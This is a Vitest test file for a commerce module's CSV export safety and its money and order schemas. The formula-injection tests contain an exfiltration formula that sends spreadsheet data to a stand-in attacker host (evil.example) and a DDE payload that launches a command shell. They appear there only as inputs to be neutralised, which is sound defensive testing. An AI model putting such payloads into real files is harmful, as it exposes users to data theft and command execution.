import { describe, expect, it } from 'vitest';
import {
  csvCell,
  isFormulaInjectionRisk,
  neutraliseCsvCell,
  normalisedOrderSchema,
  rateBpsSchema,
  signedMoneySchema,
  toCsv,
} from './commerce.js';

const gbp = (amountMinor: number) => ({ amountMinor, currency: 'GBP' });

/* ------------------------------------------------- formula injection */

describe('CSV formula injection', () => {
  it.each(['=', '+', '-', '@', '\t', '\r'])('flags a cell starting with %j', (ch) => {
    expect(isFormulaInjectionRisk(`${ch}SUM(A1:A9)`)).toBe(true);
  });

  it('neutralises the classic exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil.example?d="&A1,"click")';
    const safe = neutraliseCsvCell(payload);
    expect(safe.startsWith("'")).toBe(true);
    // The content survives; only its interpretation changes.
    expect(safe.slice(1)).toBe(payload);
  });

  it('neutralises the DDE command payload', () => {
    expect(neutraliseCsvCell('@SUM(1+1)*cmd|\' /C calc\'!A0').startsWith("'")).toBe(true);
  });

  it('leaves ordinary values untouched', () => {
    for (const v of ['Amara Bell', 'ORDER-1043', '10.50', 'a-b', 'x=y']) {
      expect(neutraliseCsvCell(v)).toBe(v);
    }
  });

  it('does not treat a negative number as safe just because it is a number', () => {
    // -1000 is a legitimate refund figure AND a formula trigger. It gets
    // quoted; a spreadsheet still shows the value, it just does not evaluate.
    expect(neutraliseCsvCell('-1000')).toBe("'-1000");
  });

  it('leaves an empty cell empty', () => {
    expect(neutraliseCsvCell('')).toBe('');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('quotes and escapes after neutralising, in that order', () => {
    // A payload containing a comma must be both prefixed and quoted, or the
    // prefix would land inside a cell that has already been split.
    expect(csvCell('=A1,B1')).toBe('"\'=A1,B1"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it('produces an export whose columns still line up', () => {
    const csv = toCsv(
      [{ name: 'Bell, Amara', note: '=cmd()', amount: -500 }],
      ['name', 'note', 'amount'],
    );
    const lines = csv.trim().split('\n');
    expect(lines[0]).toBe('name,note,amount');
    expect(lines[1]).toBe('"Bell, Amara",\'=cmd(),\'-500');

    // Column count survives the escaping.
    let inQuote = false;
    let commas = 0;
    for (const ch of lines[1] ?? '') {
      if (ch === '"') inQuote = !inQuote;
      else if (ch === ',' && !inQuote) commas += 1;
    }
    expect(commas).toBe(2);
  });
});

/* ------------------------------------------------------------- money */

describe('signedMoneySchema', () => {
  it('accepts a negative amount, which a reversal needs', () => {
    expect(signedMoneySchema.safeParse(gbp(-500)).success).toBe(true);
  });

  it('rejects a float', () => {
    const r = signedMoneySchema.safeParse({ amountMinor: 10.5, currency: 'GBP' });
    expect(r.success).toBe(false);
    expect(JSON.stringify(r)).toMatch(/never a float/);
  });

  it('rejects a non-ISO currency', () => {
    expect(signedMoneySchema.safeParse({ amountMinor: 1, currency: 'pounds' }).success).toBe(false);
    expect(signedMoneySchema.safeParse({ amountMinor: 1, currency: 'gbp' }).success).toBe(false);
  });

  it('accepts a currency outside the old four-value union', () => {
    // The whole point of widening: an AUD order must ingest, not fail.
    expect(signedMoneySchema.safeParse({ amountMinor: 100, currency: 'AUD' }).success).toBe(true);
    expect(signedMoneySchema.safeParse({ amountMinor: 100, currency: 'JPY' }).success).toBe(true);
  });

  it('rejects an amount beyond safe integer range', () => {
    expect(
      signedMoneySchema.safeParse({ amountMinor: Number.MAX_SAFE_INTEGER + 2, currency: 'GBP' })
        .success,
    ).toBe(false);
  });
});

describe('rateBpsSchema', () => {
  it('accepts whole basis points within range', () => {
    for (const v of [0, 1, 1250, 10_000]) expect(rateBpsSchema.safeParse(v).success).toBe(true);
  });

  it('rejects a fractional rate with a message that explains the unit', () => {
    const r = rateBpsSchema.safeParse(0.125);
    expect(r.success).toBe(false);
    expect(JSON.stringify(r)).toMatch(/12\.5% is 1250/);
  });

  it('rejects above 100%', () => {
    expect(rateBpsSchema.safeParse(10_001).success).toBe(false);
  });
});

/* ------------------------------------------------------------ orders */

describe('normalisedOrderSchema', () => {
  const base = {
    externalOrderId: 'ORD-1',
    orderedAt: '2026-09-01T10:00:00Z',
    total: gbp(10_000),
    subtotal: gbp(9_000),
    rawRow: { id: 'ORD-1' },
  };

  it('accepts a well-formed order', () => {
    expect(normalisedOrderSchema.safeParse(base).success).toBe(true);
  });

  it('defaults status, customerType and discount code', () => {
    const r = normalisedOrderSchema.parse(base);
    expect(r.status).toBe('confirmed');
    expect(r.customerType).toBe('unknown');
    expect(r.discountCodeUsed).toBeNull();
  });

  it('refuses a subtotal in a different currency from the total', () => {
    const r = normalisedOrderSchema.safeParse({
      ...base,
      subtotal: { amountMinor: 9_000, currency: 'USD' },
    });
    expect(r.success).toBe(false);
    expect(JSON.stringify(r)).toMatch(/same currency/);
  });

  it('refuses a subtotal larger than the total', () => {
    const r = normalisedOrderSchema.safeParse({ ...base, subtotal: gbp(11_000) });
    expect(r.success).toBe(false);
    expect(JSON.stringify(r)).toMatch(/cannot exceed total/);
  });

  it('refuses a refunded order that does not say how much', () => {
    const r = normalisedOrderSchema.safeParse({ ...base, status: 'refunded' });
    expect(r.success).toBe(false);
    expect(JSON.stringify(r)).toMatch(/how much was refunded/);
  });

  it('accepts a partial refund that states its amount', () => {
    expect(
      normalisedOrderSchema.safeParse({
        ...base,
        status: 'partially_refunded',
        refundedAmount: gbp(2_500),
        refundedAt: '2026-09-05T10:00:00Z',
      }).success,
    ).toBe(true);
  });

  it('refuses a refund in a different currency from the order', () => {
    const r = normalisedOrderSchema.safeParse({
      ...base,
      status: 'refunded',
      refundedAmount: { amountMinor: 2_500, currency: 'USD' },
    });
    expect(r.success).toBe(false);
  });

  it('refuses a negative total', () => {
    expect(normalisedOrderSchema.safeParse({ ...base, total: gbp(-1) }).success).toBe(false);
  });

  it('keeps the raw row verbatim', () => {
    const raw = { id: 'ORD-1', 'Customer email': 'x@y.com', Note: '=cmd()' };
    const r = normalisedOrderSchema.parse({ ...base, rawRow: raw });
    // Stored exactly as uploaded — neutralisation happens on export, not ingest.
    expect(r.rawRow).toEqual(raw);
  });
});
